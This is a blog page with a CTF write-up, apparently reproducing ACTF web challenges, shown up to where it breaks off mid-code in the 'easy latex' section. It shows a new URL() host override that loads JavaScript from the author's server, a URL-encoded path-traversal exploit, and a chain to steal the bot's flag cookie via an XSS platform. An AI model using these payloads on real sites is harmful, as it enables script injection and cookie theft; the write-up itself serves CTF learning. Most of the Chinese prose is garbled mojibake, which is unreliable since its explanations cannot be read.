<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>ACTF-å¤ç° | å…‰è¾‰çš„blogå•¦~~</title><meta name="author" content="1llustrious"><meta name="copyright" content="1llustrious"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="å†™åœ¨å‰é¢ easy latex  new URL ç‰¹æ€§ğŸ˜‚  è¿ç”¨åˆ°é¢˜ç›®ğŸ¤ª   visit è§¦å‘   hooks  what is webhookğŸ¤” Abusing Jenkins login å¼€æ‰“ğŸ˜¤   ~Ave Mujicaâ€™s Masquerade~  æºç ï¼Œå†²ğŸ˜“   story  æºç ğŸ¤”      å†™åœ¨å‰é¢ å‘œå‘œå‘œï¼Œshanhegiegie å¤ªçŒ›äº†ï¼Œæ‰“äº†ä¸€å¤©æ‡’çŒ«ï¼Œç¬¬äºŒå¤©è¿˜è¦ä¸Š">
<meta property="og:type" content="article">
<meta property="og:title" content="ACTF-å¤ç°">
<meta property="og:url" content="https://1llustrious.github.io/2023/12/02/ACTF-%E5%A4%8D%E7%8E%B0/index.html">
<meta property="og:site_name" content="å…‰è¾‰çš„blogå•¦~~">
<meta property="og:description" content="å†™åœ¨å‰é¢ easy latex  new URL ç‰¹æ€§ğŸ˜‚  è¿ç”¨åˆ°é¢˜ç›®ğŸ¤ª   visit è§¦å‘   hooks  what is webhookğŸ¤” Abusing Jenkins login å¼€æ‰“ğŸ˜¤   ~Ave Mujicaâ€™s Masquerade~  æºç ï¼Œå†²ğŸ˜“   story  æºç ğŸ¤”      å†™åœ¨å‰é¢ å‘œå‘œå‘œï¼Œshanhegiegie å¤ªçŒ›äº†ï¼Œæ‰“äº†ä¸€å¤©æ‡’çŒ«ï¼Œç¬¬äºŒå¤©è¿˜è¦ä¸Š">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://raw.githubusercontent.com/1llustrious/img/main/202311301720501.jpg">
<meta property="article:published_time" content="2023-12-02T00:12:41.000Z">
<meta property="article:modified_time" content="2023-12-02T11:42:25.754Z">
<meta property="article:author" content="1llustrious">
<meta property="article:tag" content="WP">
<meta property="article:tag" content="CTF">
<meta property="article:tag" content="å¤ç°">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://raw.githubusercontent.com/1llustrious/img/main/202311301720501.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://1llustrious.github.io/2023/12/02/ACTF-%E5%A4%8D%E7%8E%B0/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"><link rel="preconnect" href="//busuanzi.ibruce.info"><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: 'Copy Successful',
    error: 'Copy Error',
    noSupport: 'Browser Not Supported'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: 'Just now',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: 'Load More'
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'ACTF-å¤ç°',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2023-12-02 19:42:25'
}</script><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
        if (t === 'dark') activateDarkMode()
        else if (t === 'light') activateLightMode()
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><meta name="generator" content="Hexo 6.0.0"><link rel="alternate" href="/atom.xml" title="å…‰è¾‰çš„blogå•¦~~" type="application/atom+xml">
<script>function loadCss(l){var d=document,h=d.head,s=d.createElement('link');s.rel='stylesheet';s.href=l;!function e(f){if (d.body)return f();setTimeout(function(){e(f)})}(function(){h.appendChild(s);});}loadCss('/style.css');loadCss('https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css');loadCss('https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css');loadCss('https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css');</script><noscript><link rel="stylesheet" href="/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css"></noscript></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://raw.githubusercontent.com/1llustrious/img/main/202312061631677.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">8</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">4</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">0</div></a></div><hr class="custom-hr"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://raw.githubusercontent.com/1llustrious/img/main/202311301720501.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="å…‰è¾‰çš„blogå•¦~~"><span class="site-name">å…‰è¾‰çš„blogå•¦~~</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">ACTF-å¤ç°</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2023-12-02T00:12:41.000Z" title="Created 2023-12-02 08:12:41">2023-12-02</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2023-12-02T11:42:25.754Z" title="Updated 2023-12-02 19:42:25">2023-12-02</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="ACTF-å¤ç°"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><div class="top-img" style="background-image: url('https://raw.githubusercontent.com/1llustrious/img/main/202311301720501.jpg');"></div><article class="post-content" id="article-container"><!-- toc -->
<ul>
<li><a href="#%E5%86%99%E5%9C%A8%E5%89%8D%E9%9D%A2">å†™åœ¨å‰é¢</a></li>
<li><a href="#easy-latex">easy latex</a>
<ul>
<li><a href="#new-url%E7%89%B9%E6%80%A7">new URL ç‰¹æ€§ğŸ˜‚</a>
<ul>
<li><a href="#%E8%BF%90%E7%94%A8%E5%88%B0%E9%A2%98%E7%9B%AE">è¿ç”¨åˆ°é¢˜ç›®ğŸ¤ª</a></li>
</ul>
</li>
<li><a href="#visit%E8%A7%A6%E5%8F%91">visit è§¦å‘</a></li>
</ul>
</li>
<li><a href="#hooks">hooks</a>
<ul>
<li><a href="#what-is-webhook">what is webhookğŸ¤”</a></li>
<li><a href="#abusing-jenkins-login">Abusing Jenkins login</a></li>
<li><a href="#%E5%BC%80%E6%89%93">å¼€æ‰“ğŸ˜¤</a></li>
</ul>
</li>
<li><a href="#~ave-mujicas-masquerade~">~Ave Mujicaâ€™s Masquerade~</a>
<ul>
<li><a href="#%E6%BA%90%E7%A0%81%E5%86%B2">æºç ï¼Œå†²ğŸ˜“</a></li>
</ul>
</li>
<li><a href="#story">story</a>
<ul>
<li><a href="#%E6%BA%90%E7%A0%81">æºç ğŸ¤”</a></li>
</ul>
</li>
</ul>
<!-- tocstop -->
<h1 id="å†™åœ¨å‰é¢"><span id="å†™åœ¨å‰é¢"> å†™åœ¨å‰é¢</span></h1>
<p>å‘œå‘œå‘œï¼Œshanhegiegie å¤ªçŒ›äº†ï¼Œæ‰“äº†ä¸€å¤©æ‡’çŒ«ï¼Œç¬¬äºŒå¤©è¿˜è¦ä¸Šè¯¾ï¼Œå‘¨å…­è¡¥è¯¾ï¼Œæ˜¯è°å•Šï¼ŒåŸæ¥æ˜¯ğŸ‘´å•Šï¼Œé‚£æ²¡äº‹äº† (nmsl).</p>
<p>å‚è€ƒ:</p>
<p><a target="_blank" rel="noopener" href="https://wm-ctf-team.feishu.cn/docx/PLbbdhwdyoAefuxokXwcYppzn1c">https://wm-ctf-team.feishu.cn/docx/PLbbdhwdyoAefuxokXwcYppzn1c</a></p>
<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/pzXApXq3LhZvZvc87qqMDw">å¾®ä¿¡å…¬ä¼—å¹³å° (qq.com)</a></p>
<h1 id="easy-latex"><span id="easy-latex"> easy latex</span></h1>
<h2 id="new-url-ç‰¹æ€§"><span id="new-url-ç‰¹æ€§"> new URL ç‰¹æ€§ğŸ˜‚</span></h2>
<p>å…ˆæ¥ä¸ªå° demo</p>
<figure class="highlight javascript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> username = <span class="string">"43.143.192.19:1145"</span></span><br><span class="line"><span class="keyword">const</span> vip_url = <span class="string">"http://vip:5000/"</span></span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="keyword">new</span> <span class="title function_">URL</span>(username,vip_url))</span><br></pre></td></tr></tbody></table></figure>
<p><img src="/2023/12/02/ACTF-%E5%A4%8D%E7%8E%B0/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20231030151912.png" alt="å¾®ä¿¡æˆªå›¾_20231030151912"></p>
<p>å¦‚æ­¤ï¼Œpathname æ˜¯æˆ‘ä»¬çš„ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œhost æ˜¯æˆ‘ä»¬çš„ç¬¬äºŒä¸ªå‚æ•°.</p>
<p>å€˜è‹¥æˆ‘ç¬¬ä¸€ä¸ªå‚æ•°å‰é¢åŠ  \\ æˆ–æ˜¯ //, é˜ä¸‹åˆå½“å¦‚ä½•åº”å¯¹ğŸ˜“.</p>
<figure class="highlight javascript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> username = <span class="string">"\\\\43.143.192.19:1145"</span></span><br><span class="line"><span class="comment">//const username = "//43.143.192.19:1145"</span></span><br><span class="line"><span class="keyword">const</span> vip_url = <span class="string">"http://vip:5000/"</span></span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="keyword">new</span> <span class="title function_">URL</span>(username,vip_url))</span><br></pre></td></tr></tbody></table></figure>
<p><img src="/2023/12/02/ACTF-%E5%A4%8D%E7%8E%B0/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20231030152151.png" alt="å¾®ä¿¡æˆªå›¾_20231030152151"></p>
<p>å–œæ¬¢æˆ‘ç»•è¿‡æ±¡æŸ“ host å—ğŸ˜›</p>
<h3 id="è¿ç”¨åˆ°é¢˜ç›®"><span id="è¿ç”¨åˆ°é¢˜ç›®"> è¿ç”¨åˆ°é¢˜ç›®ğŸ¤ª</span></h3>
<p>ä¸å¤š bb, æºç é‰´èµä¸€æ³¢</p>
<figure class="highlight javascript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">get</span>(<span class="string">'/preview'</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> {</span><br><span class="line">    <span class="keyword">let</span> { tex, theme } = req.<span class="property">query</span></span><br><span class="line">    <span class="keyword">if</span> (!tex) {</span><br><span class="line">        tex = <span class="string">'Today is \\today.'</span></span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">const</span> nonce = <span class="title function_">getNonce</span>(<span class="number">16</span>)</span><br><span class="line">    <span class="keyword">let</span> base = <span class="string">'https://cdn.jsdelivr.net/npm/latex.js/dist/'</span></span><br><span class="line">    <span class="keyword">if</span> (theme) {</span><br><span class="line">        base = <span class="keyword">new</span> <span class="title function_">URL</span>(theme, <span class="string">`http://<span class="subst">${req.headers.host}</span>/theme/`</span>) + <span class="string">'/'</span></span><br><span class="line">    }</span><br><span class="line">    res.<span class="title function_">render</span>(<span class="string">'preview.html'</span>, { tex, nonce, base })</span><br><span class="line">})</span><br></pre></td></tr></tbody></table></figure>
<p>æˆ‘ç›´æ¥ theme ä¸Šæ”¾å…¥æˆ‘çš„ vps, è¿œç¨‹åŠ è½½å¥¥è¥¿ç»™</p>
<figure class="highlight javascript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preview?tex=asd&amp;theme=<span class="comment">//43.143.192.19:1145</span></span><br></pre></td></tr></tbody></table></figure>
<p><img src="/2023/12/02/ACTF-%E5%A4%8D%E7%8E%B0/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20231030173612.png" alt="å¾®ä¿¡æˆªå›¾_20231030173612"></p>
<p>ç»ä¸€æ ¼å¾·æ‹‰ç±³çš„æµ‹è¯•ğŸ˜¤,wcsndm, å°±ç®—å•¥è·¯å¾„éƒ½ä¸åŠ ä»–éƒ½ä¼šè®¿é—® /js/base.js, è¿™å¾ˆä¸è‡ªç”±ğŸ¤”.</p>
<p>æ²¡å…³ç³»ï¼Œç›´æ¥åœ¨ vps èµ·ä¸€ä¸ªä¸€æ¨¡ä¸€æ ·çš„ emoji,ğŸ‘´çœŸæ˜¯ä¸ªå¤©æ‰.</p>
<figure class="highlight javascript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">alert</span>(<span class="string">'wcsndm'</span>);</span><br></pre></td></tr></tbody></table></figure>
<p>/var/www/html/base/base.js æ”¾ä¸Šè¿™ä¸ªä»£ç ï¼Œæµ‹è¯•ä¸€æ³¢ï¼Œè®©æˆ‘ç‹ ç‹ åœ°æµ‹ï¼ï¼ï¼ğŸ¥µ</p>
<p><img src="/2023/12/02/ACTF-%E5%A4%8D%E7%8E%B0/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20231030175131.png" alt="å¾®ä¿¡æˆªå›¾_20231030175131"></p>
<p>æ¬§å†…çš„æ‰‹ï¼Œå¥½æ±‰ï¼Œå¥¥è¥¿ç»™ï¼Œçˆ½çš„é›…ç—ï¼Œæ¯”ğŸå‡ºæ¥è¿˜çˆ½.</p>
<h2 id="visit-è§¦å‘"><span id="visit-è§¦å‘"> visit è§¦å‘</span></h2>
<p>ä¸å¤š bb, ä¸Šæºç </p>
<figure class="highlight javascript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">get</span>(<span class="string">'/share/:id'</span>, reportLimiter, <span class="keyword">async</span> (req, res) =&gt; {</span><br><span class="line">    <span class="keyword">const</span> { id } = req.<span class="property">params</span></span><br><span class="line">    <span class="keyword">if</span> (!id) {</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">'no note id specified'</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">const</span> url = <span class="string">`http://localhost:<span class="subst">${PORT}</span>/note/<span class="subst">${id}</span>`</span></span><br><span class="line">    <span class="keyword">try</span> {</span><br><span class="line">        <span class="keyword">await</span> <span class="title function_">visit</span>(url)</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">'done'</span>)</span><br><span class="line">    } <span class="keyword">catch</span> (e) {</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(e)</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">'something error'</span>)</span><br><span class="line">    }</span><br><span class="line">})</span><br></pre></td></tr></tbody></table></figure>
<figure class="highlight javascript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">visit</span> = <span class="keyword">async</span> (<span class="params">url</span>) =&gt; {</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`start: <span class="subst">${url}</span>`</span>)</span><br><span class="line">    <span class="keyword">const</span> browser = <span class="keyword">await</span> puppeteer.<span class="title function_">launch</span>({</span><br><span class="line">        <span class="attr">headless</span>: <span class="string">'new'</span>,</span><br><span class="line">        <span class="attr">executablePath</span>: <span class="string">'/usr/bin/google-chrome-stable'</span>,</span><br><span class="line">        <span class="attr">args</span>: [<span class="string">'--no-sandbox'</span>],</span><br><span class="line">    })</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> ctx = <span class="keyword">await</span> browser.<span class="title function_">createIncognitoBrowserContext</span>();</span><br><span class="line">    <span class="keyword">try</span>{</span><br><span class="line">        <span class="keyword">const</span> page = <span class="keyword">await</span> ctx.<span class="title function_">newPage</span>();</span><br><span class="line">        <span class="keyword">await</span> page.<span class="title function_">setCookie</span>({</span><br><span class="line">            <span class="attr">name</span>: <span class="string">'flag'</span>,</span><br><span class="line">            <span class="attr">value</span>: <span class="variable constant_">FLAG</span>,</span><br><span class="line">            <span class="attr">domain</span>: <span class="string">`<span class="subst">${APP_HOST}</span>:<span class="subst">${APP_PORT}</span>`</span>,</span><br><span class="line">            <span class="attr">httpOnly</span>: <span class="literal">true</span></span><br><span class="line">        })</span><br><span class="line">        <span class="keyword">await</span> page.<span class="title function_">goto</span>(url, {<span class="attr">timeout</span>: <span class="number">5000</span>})</span><br><span class="line">        <span class="keyword">await</span> <span class="title function_">sleep</span>(<span class="number">3000</span>)</span><br><span class="line">        <span class="keyword">await</span> page.<span class="title function_">close</span>()</span><br><span class="line">    }<span class="keyword">catch</span>(e){</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(e);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">await</span> ctx.<span class="title function_">close</span>();</span><br><span class="line">    <span class="keyword">await</span> browser.<span class="title function_">close</span>()</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`done: <span class="subst">${url}</span>`</span>)</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<p>é‚£ä¹ˆä¼—æ‰€å‘¨çŸ¥ï¼Œvisit å°±æ˜¯èƒ½å¤Ÿè‡ªè¡Œæ‰“å¼€æµè§ˆå™¨å¹¶ä¸”è®¿é—®ï¼Œä¸çŸ¥é“çš„è¯ä¸Šç½‘æŸ¥ï¼Œåˆ«é—®ğŸ‘´.</p>
<figure class="highlight javascript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">post</span>(<span class="string">'/vip'</span>, auth, <span class="keyword">async</span> (req, res) =&gt; {</span><br><span class="line">    <span class="keyword">let</span> username = req.<span class="property">session</span>.<span class="property">username</span></span><br><span class="line">    <span class="keyword">let</span> { code } = req.<span class="property">body</span></span><br><span class="line">    <span class="keyword">let</span> vip_url = <span class="variable constant_">VIP_URL</span></span><br><span class="line">    <span class="keyword">let</span> data = <span class="keyword">await</span> (<span class="keyword">await</span> <span class="title function_">fetch</span>(<span class="keyword">new</span> <span class="title function_">URL</span>(username, vip_url), {</span><br><span class="line">        <span class="attr">method</span>: <span class="string">'POST'</span>,</span><br><span class="line">        <span class="attr">headers</span>: {</span><br><span class="line">            <span class="title class_">Cookie</span>: <span class="title class_">Object</span>.<span class="title function_">entries</span>(req.<span class="property">cookies</span>).<span class="title function_">map</span>(<span class="function">(<span class="params">[k, v]</span>) =&gt;</span> <span class="string">`<span class="subst">${k}</span>=<span class="subst">${v}</span>`</span>).<span class="title function_">join</span>(<span class="string">'; '</span>)</span><br><span class="line">        },</span><br><span class="line">        <span class="attr">body</span>: <span class="keyword">new</span> <span class="title class_">URLSearchParams</span>({ code })</span><br><span class="line">    })).<span class="title function_">text</span>()</span><br><span class="line">    <span class="keyword">if</span> (<span class="string">'ok'</span> == data) {</span><br><span class="line">        res.<span class="title function_">cookie</span>(<span class="string">'token'</span>, <span class="title function_">sign</span>({ username, <span class="attr">isVip</span>: <span class="literal">true</span> }))</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">'Congratulation! You are VIP now.'</span>)</span><br><span class="line">    } <span class="keyword">else</span> {</span><br><span class="line">        res.<span class="title function_">send</span>(data)</span><br><span class="line">    }</span><br><span class="line">})</span><br></pre></td></tr></tbody></table></figure>
<p>è€Œè¿™ä¸ª visit, æ‰“å¼€æµè§ˆå™¨è®¿é—®ï¼ŒğŸªé‡Œé¢æ˜¯æºå¸¦ç€ flag, æ‰€ä»¥ğŸ‘´è¦æ‹¿åˆ°è¿™ä¸ªğŸª.</p>
<p>ä½†æ˜¯ flag ä¸ä¸€å®šèƒ½å¤Ÿä¼ æ¥ï¼Œè€Œ vip è·¯ç”±èƒ½å¤Ÿå¼ºåˆ¶è®© Cookie æºå¸¦å°±å¾ˆå¥½âœŒ</p>
<p>ä¸è¿‡ç›´æ¥è®¿é—®æ˜¯æ‹¿ä¸åˆ°çš„ï¼Œæ€ä¹ˆåŠæï¼Œxss è¿‡æ¥ï¼</p>
<figure class="highlight javascript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/shareè·¯ç”±<span class="keyword">new</span> urlè®¿é—®-&gt;<span class="regexp">/previewè·¯ç”±è¿›è¡Œnew url xss-&gt;åŠ è½½vpsæ¶æ„js-&gt;ä»¥å¸¦ğŸªçš„èº«ä»½è®¿é—®/</span>loginå’Œ/vip,è§¦å‘vipçš„fetchè®¿é—®-&gt;å°†ğŸªæ•°æ®è½¬åˆ°xsså¹³å°.</span><br></pre></td></tr></tbody></table></figure>
<p>ä½¿ç”¨ urlencode</p>
<figure class="highlight javascript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/share/%2e%2e%2f%<span class="number">70</span>%<span class="number">72</span>%<span class="number">65</span>%<span class="number">76</span>%<span class="number">69</span>%<span class="number">65</span>%<span class="number">77</span>%3f%<span class="number">74</span>%<span class="number">65</span>%<span class="number">78</span>%3d%<span class="number">61</span>%<span class="number">77</span>%<span class="number">64</span>%<span class="number">61</span>%<span class="number">64</span>%<span class="number">61</span>%<span class="number">77</span>%<span class="number">64</span>%<span class="number">26</span>%<span class="number">74</span>%<span class="number">68</span>%<span class="number">65</span>%6d%<span class="number">65</span>%3d%2f%2f%<span class="number">34</span>%<span class="number">33</span>%2e%<span class="number">31</span>%<span class="number">34</span>%<span class="number">33</span>%2e%<span class="number">31</span>%<span class="number">39</span>%<span class="number">32</span>%2e%<span class="number">31</span>%<span class="number">39</span>%3a%<span class="number">31</span>%<span class="number">31</span>%<span class="number">34</span>%<span class="number">35</span></span><br><span class="line">/share/../preview?tex=awdadawd&amp;theme=<span class="comment">//43.143.192.19:1145</span></span><br></pre></td></tr></tbody></table></figure>
<p>ç›®å½•ç©¿è¶Šå¤§æ³•è®¿é—® preview, è‡³äºä¸ºå•¥ç”¨ url ç¼–ç ï¼Œå› ä¸ºæ˜¯æ¥åœ¨è·¯å¾„ä¹‹åçš„ï¼Œå®¹æ˜“è¢«è§£ææˆè·¯å¾„è€Œä¸æ˜¯ä¼ é€’çš„å‚æ•°.</p>
<p>js ä¸Šæ”¾ä¸¶ä¸œè¥¿</p>
<figure class="highlight javascript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> login = <span class="string">'/login'</span>;</span><br><span class="line"><span class="keyword">const</span> vip = <span class="string">'/vip'</span>;</span><br><span class="line"><span class="keyword">const</span> 